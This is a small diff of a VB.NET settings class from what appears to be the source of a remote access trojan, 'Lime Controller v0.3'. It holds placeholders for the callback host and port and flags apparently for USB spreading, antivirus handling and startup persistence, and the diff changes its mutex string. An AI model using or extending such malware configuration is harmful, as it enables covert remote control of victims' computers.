@@ -1,7 +1,6 @@
 ﻿
 Namespace Lime
     Public Class Settings
-        Public Shared MyID As String = "Lime Controller v0.3"
         Public Shared LHOST As String = "%LHOST%"
         Public Shared LPORT As Integer = "%LPORT%"
         Public Shared SPL As String = "'L'"
@@ -9,7 +8,7 @@ Namespace Lime
         Public Shared LEXE As String = "%LEXE%"
         Public Shared STUPNAME As String = "%STNAME%"
         Public Shared NMT As Threading.Mutex = Nothing
-        Public Shared MTX As String = "CT5HymJKjk"
+        Public Shared MTX As String = "Lime_Controller_v0.3"
         Public Shared SPUSB As Boolean = "%SPUSB%"
         Public Shared ANTIV As Boolean = "%ANTIV%"
         Public Shared DRCHK As Boolean = "%DRCHK%"
